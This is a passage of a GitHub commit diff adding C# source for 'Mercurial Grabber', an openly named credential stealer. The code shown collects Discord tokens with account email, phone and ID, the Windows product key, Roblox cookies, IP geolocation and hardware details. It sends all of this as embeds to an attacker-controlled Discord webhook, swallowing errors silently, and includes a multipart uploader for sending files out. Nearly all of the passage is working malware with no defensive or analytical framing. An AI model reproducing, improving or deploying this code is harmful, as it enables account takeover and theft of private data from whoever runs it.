        static void GrabToken()
        {
            List<string> tokens = Grabber.Grab();
            foreach (string token in tokens)
            {
                Token t = new Token(token);
                string content = WebhookContent.Token(t.email, t.phoneNumber, token, t.fullUsername, t.avatarUrl, t.locale, t.creationDate, t.userId);
                wh.SendContent(content);
            }
        }

        static void GrabProduct()
        {
            wh.SendContent(WebhookContent.ProductKey(Windows.GetProductKey()));

        }
        static void GrabIP()
        {
            IP varIP = new IP();
            varIP.GetIPGeo();

            wh.SendContent(WebhookContent.IP(varIP.ip, varIP.country, varIP.GetCountryIcon(), varIP.regionName, varIP.city, varIP.zip, varIP.isp));
        }

        static void GrabHardware()
        {
            Machine m = new Machine();
            wh.SendContent(WebhookContent.Hardware(m.osName, m.osArchitecture, m.osVersion, m.processName, m.gpuVideo, m.gpuVersion, m.diskDetails, m.pcMemory));
        }
    }


    class IP
    {
        public string ip = String.Empty;
        public string country = String.Empty;
        public string countryCode = String.Empty;
        public string regionName = String.Empty;
        public string city = String.Empty;
        public string zip = String.Empty;
        public string timezone = String.Empty;
        public string isp = String.Empty;

        public IP ()
        {
            ip = GetIP();
        }

        private string GetIP()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var response = client.GetAsync("https://ip4.seeip.org");
                    var final = response.Result.Content.ReadAsStringAsync();
                    return final.Result;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                return String.Empty;
            }
        }
        public void GetIPGeo()
        {
            string resp;
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var response = client.GetAsync("http://ip-api.com/" + "/json/" + ip);
                    var final = response.Result.Content.ReadAsStringAsync();
                    resp = final.Result;
                    country = Common.Extract("country", resp);
                    countryCode = Common.Extract("countryCode", resp);
                    regionName = Common.Extract("regionName", resp);
                    city = Common.Extract("city", resp);
                    zip = Common.Extract("zip", resp);
                    timezone = Common.Extract("timezone", resp);
                    isp = Common.Extract("isp", resp);
                    Console.WriteLine(resp);
                }
            }

            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

        }
        public string GetCountryIcon()
        {
            return "https://www.countryflags.io/"  + countryCode + "/flat/48.png";
        }

    }
}
 352  Mercurial/Resources/SQLite.cs 
Large diffs are not rendered by default.

 19  Mercurial/Resources/User.cs 
@@ -0,0 +1,19 @@
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.IO;

namespace Stealer
{
    class User
    {
        public static string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");
    }

}
 213  Mercurial/Resources/Webhook.cs 
@@ -0,0 +1,213 @@
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.IO;

namespace Stealer
{
    public static class FormUpload
    {
        private static readonly Encoding encoding = Encoding.UTF8;
        public static HttpWebResponse MultipartFormDataPost(string postUrl, string userAgent, Dictionary<string, object> postParameters)
        {
            string formDataBoundary = String.Format("----------{0:N}", Guid.NewGuid());

            string contentType = "multipart/form-data; boundary=" + formDataBoundary;

            byte[] formData = GetMultipartFormData(postParameters, formDataBoundary);

            return PostForm(postUrl, userAgent, contentType, formData);
        }

        private static HttpWebResponse PostForm(string postUrl, string userAgent, string contentType, byte[] formData)
        {

            HttpWebRequest request = WebRequest.Create(postUrl) as HttpWebRequest;

            if (request == null)
            {
                throw new NullReferenceException("request is not a http request");
            }

            request.Method = "POST";
            request.ContentType = contentType;
            request.UserAgent = userAgent;
            request.CookieContainer = new CookieContainer();
            request.ContentLength = formData.Length;

            using (Stream requestStream = request.GetRequestStream())
            {
                requestStream.Write(formData, 0, formData.Length);
                requestStream.Close();
            }

            return request.GetResponse() as HttpWebResponse;
        }

        private static byte[] GetMultipartFormData(Dictionary<string, object> postParameters, string boundary)
        {
            Stream formDataStream = new System.IO.MemoryStream();
            bool needsCLRF = false;

            foreach (var param in postParameters)
            {
                if (needsCLRF)
                    formDataStream.Write(encoding.GetBytes("\r\n"), 0, encoding.GetByteCount("\r\n"));

                needsCLRF = true;

                if (param.Value is FileParameter)
                {
                    FileParameter fileToUpload = (FileParameter)param.Value;

                    string header = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"; filename=\"{2}\"\r\nContent-Type: {3}\r\n\r\n",
                        boundary,
                        param.Key,
                        fileToUpload.FileName ?? param.Key,
                        fileToUpload.ContentType ?? "application/octet-stream");

                    formDataStream.Write(encoding.GetBytes(header), 0, encoding.GetByteCount(header));

                    formDataStream.Write(fileToUpload.File, 0, fileToUpload.File.Length);
                }
                else
                {
                    string postData = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"\r\n\r\n{2}",
                        boundary,
                        param.Key,
                        param.Value);
                    formDataStream.Write(encoding.GetBytes(postData), 0, encoding.GetByteCount(postData));
                }
            }

            string footer = "\r\n--" + boundary + "--\r\n";
            formDataStream.Write(encoding.GetBytes(footer), 0, encoding.GetByteCount(footer));

            formDataStream.Position = 0;
            byte[] formData = new byte[formDataStream.Length];
            formDataStream.Read(formData, 0, formData.Length);
            formDataStream.Close();

            return formData;
        }
        public class FileParameter
        {
            public byte[] File { get; set; }
            public string FileName { get; set; }
            public string ContentType { get; set; }
            public FileParameter(byte[] file) : this(file, null) { }
            public FileParameter(byte[] file, string filename) : this(file, filename, null) { }
            public FileParameter(byte[] file, string filename, string contenttype)
            {
                File = file;
                FileName = filename;
                ContentType = contenttype;

            }
        }
    }

    public static class WebhookContent
    {
        public static string Token(string email, string phone, string token, string username, string avatar, string locale, string creation, string id)
        {
            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**Account Info**\",\"value\":\"" + "User ID: " + id + "\\nEmail: " + email + "\\nPhone Number: " + phone + "\\nLocale: " + locale + "\",\"inline\":true},{\"name\":\"**Token**\",\"value\":\"" + "`" + token + "`" + "\\nAccount Created: (`" + creation + "`)" + "\",\"inline\":false}],\"author\":{\"name\":\"" + username + "\",\"icon_url\":\"" + avatar + "\"},\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
        }

        public static string IP(string ip, string country, string countryIcon, string regionName, string city, string zip, string isp)
        {
            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**IP Address Info**\",\"value\":\"" + "IP Address - " + ip + "\\nISP - " + isp + "\\nCountry - " + country + "\\nRegion - " + regionName + "\\nCity - " + city + "\\nZip - " + zip + "\",\"inline\":true}],\"thumbnail\":{\"url\":\"" + countryIcon + "\"},\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
        }

        public static string ProductKey(string key)
        {
            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**Windows Product Key**\",\"value\":\"" + "Product Key - " + key + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
        }

        public static string Hardware(string osName, string osArchitecture, string osVersion, string processName, string gpuVideo, string gpuVersion, string diskDetails, string pcMemory)
        {
            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**OS Info**\",\"value\":\"" + "Operating System Name - " + osName + "\\nOperating System Architecture - " + osArchitecture + "\\nVersion - " + osVersion + "\",\"inline\":true}" + ",{\"name\":\"**Processor**\",\"value\":\"" + "CPU - " + processName + "\",\"inline\":false}," + "{\"name\":\"**GPU**\",\"value\":\"" + "Video Processor - " + gpuVideo + "\\nDriver Version  - " + gpuVersion + "\",\"inline\":false}" + ",{\"name\":\"**Memory**\",\"value\":\"" + "Memory - " + pcMemory + "\",\"inline\":false}," + "{\"name\":\"**Disk**\",\"value\":\"" + diskDetails + "\",\"inline\":false}" + "],\"" + "footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
        }

        public static string RobloxCookie(string cookie)
        {
            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**Roblox Cookie**\",\"value\":\"" + cookie + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
        }


        public static string SimpleMessage(string title, string message)
        {
            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**" + title + "**\",\"value\":\"" + message + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
        }
    }
    class Webhook
    {
        private string webhook;
        public Webhook(string userWebhook)
        {
            webhook = userWebhook;
        }
        public void Send(string content)
        {
            Dictionary<string, string> data = new Dictionary<string, string>();

            data.Add("content", content);
            data.Add("username", "Mercurial Grabber");
            data.Add("avatar_url", "https://i.imgur.com/vgxBhmx.png");
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.PostAsync(webhook, new FormUrlEncodedContent(data)).GetAwaiter().GetResult();
                }
            }
            catch
            {
            }
        }
        public void SendContent(string content)
        {
            try
            {
                var wr = WebRequest.Create(webhook);
                wr.ContentType = "application/json";
                wr.Method = "POST";
                using (var sw = new StreamWriter(wr.GetRequestStream()))
                    sw.Write(content);
                wr.GetResponse();
            }
            catch
            {
            }
        }

        public void SendData(string msgBody, string filename, string filepath, string application)
        {
            // read file data
            FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.Read);
            byte[] data = new byte[fs.Length];
            fs.Read(data, 0, data.Length);
            fs.Close();

            Dictionary<string, object> postParameters = new Dictionary<string, object>();
            postParameters.Add("filename", filename);
            postParameters.Add("file", new FormUpload.FileParameter(data, filename, application));

            postParameters.Add("username", "Mercurial Grabber");
            postParameters.Add("content", msgBody);
            postParameters.Add("avatar_url", "https://i.imgur.com/vgxBhmx.png");

            HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(webhook, "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0", postParameters);

            StreamReader responseReader = new StreamReader(webResponse.GetResponseStream());
            string fullResponse = responseReader.ReadToEnd();
            webResponse.Close();

            Console.WriteLine("Response: " + fullResponse);
        }
    }
}
 36  Mercurial/Testing.cs 
@@ -0,0 +1,36 @@
using System.Collections.Generic;
using System.Net.Http;

namespace Mercurial
{

    class Webhook
    {
        private string webhook;
        public Webhook(string userWebhook)
        {
            webhook = userWebhook;
        }
        public void Send(string content)
        {

            Dictionary<string, string> data = new Dictionary<string, string>
            {
                {"content", content }
            };

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.PostAsync(webhook, new FormUrlEncodedContent(data)).GetAwaiter().GetResult();
                }
            }

            catch
            {
            }

        }

}
 BIN +104 KB Mercurial/logo.ico 
Binary file not shown.
 52  Mercurial/packages.config 
@@ -0,0 +1,52 @@
<?xml version="1.0" encoding="utf-8"?>
<packages>
  <package id="Bunifu.UI.WinForms" version="5.0.6" targetFramework="net472" />
  <package id="Costura.Fody" version="5.3.0" targetFramework="net472" developmentDependency="true" />
  <package id="Fody" version="6.5.1" targetFramework="net472" developmentDependency="true" />
  <package id="Microsoft.NETCore.Platforms" version="1.1.0" targetFramework="net472" />
  <package id="Microsoft.Win32.Primitives" version="4.3.0" targetFramework="net472" />
  <package id="NETStandard.Library" version="1.6.1" targetFramework="net472" />
  <package id="System.AppContext" version="4.3.0" targetFramework="net472" />
  <package id="System.Collections" version="4.3.0" targetFramework="net472" />
  <package id="System.Collections.Concurrent" version="4.3.0" targetFramework="net472" />
  <package id="System.Console" version="4.3.0" targetFramework="net472" />
  <package id="System.Diagnostics.Debug" version="4.3.0" targetFramework="net472" />
  <package id="System.Diagnostics.DiagnosticSource" version="4.3.0" targetFramework="net472" />
  <package id="System.Diagnostics.Tools" version="4.3.0" targetFramework="net472" />
  <package id="System.Diagnostics.Tracing" version="4.3.0" targetFramework="net472" />
  <package id="System.Globalization" version="4.3.0" targetFramework="net472" />
  <package id="System.Globalization.Calendars" version="4.3.0" targetFramework="net472" />
  <package id="System.IO" version="4.3.0" targetFramework="net472" />
  <package id="System.IO.Compression" version="4.3.0" targetFramework="net472" />
  <package id="System.IO.Compression.ZipFile" version="4.3.0" targetFramework="net472" />
  <package id="System.IO.FileSystem" version="4.3.0" targetFramework="net472" />
  <package id="System.IO.FileSystem.Primitives" version="4.3.0" targetFramework="net472" />
  <package id="System.Linq" version="4.3.0" targetFramework="net472" />
  <package id="System.Linq.Expressions" version="4.3.0" targetFramework="net472" />
  <package id="System.Net.Http" version="4.3.0" targetFramework="net472" />
  <package id="System.Net.Primitives" version="4.3.0" targetFramework="net472" />
  <package id="System.Net.Sockets" version="4.3.0" targetFramework="net472" />
  <package id="System.ObjectModel" version="4.3.0" targetFramework="net472" />
  <package id="System.Reflection" version="4.3.0" targetFramework="net472" />
  <package id="System.Reflection.Extensions" version="4.3.0" targetFramework="net472" />
  <package id="System.Reflection.Primitives" version="4.3.0" targetFramework="net472" />
  <package id="System.Resources.ResourceManager" version="4.3.0" targetFramework="net472" />
  <package id="System.Runtime" version="4.3.0" targetFramework="net472" />
  <package id="System.Runtime.Extensions" version="4.3.0" targetFramework="net472" />
  <package id="System.Runtime.Handles" version="4.3.0" targetFramework="net472" />
  <package id="System.Runtime.InteropServices" version="4.3.0" targetFramework="net472" />
  <package id="System.Runtime.InteropServices.RuntimeInformation" version="4.3.0" targetFramework="net472" />
  <package id="System.Runtime.Numerics" version="4.3.0" targetFramework="net472" />
  <package id="System.Security.Cryptography.Algorithms" version="4.3.0" targetFramework="net472" />
  <package id="System.Security.Cryptography.Encoding" version="4.3.0" targetFramework="net472" />
  <package id="System.Security.Cryptography.Primitives" version="4.3.0" targetFramework="net472" />
  <package id="System.Security.Cryptography.X509Certificates" version="4.3.0" targetFramework="net472" />
  <package id="System.Text.Encoding" version="4.3.0" targetFramework="net472" />
  <package id="System.Text.Encoding.Extensions" version="4.3.0" targetFramework="net472" />
  <package id="System.Text.RegularExpressions" version="4.3.0" targetFramework="net472" />
  <package id="System.Threading" version="4.3.0" targetFramework="net472" />
  <package id="System.Threading.Tasks" version="4.3.0" targetFramework="net472" />
  <package id="System.Threading.Timer" version="4.3.0" targetFramework="net472" />
  <package id="System.Xml.ReaderWriter" version="4.3.0" targetFramework="net472" />
  <package id="System.Xml.XDocument" version="4.3.0" targetFramework="net472" />
</packages> 
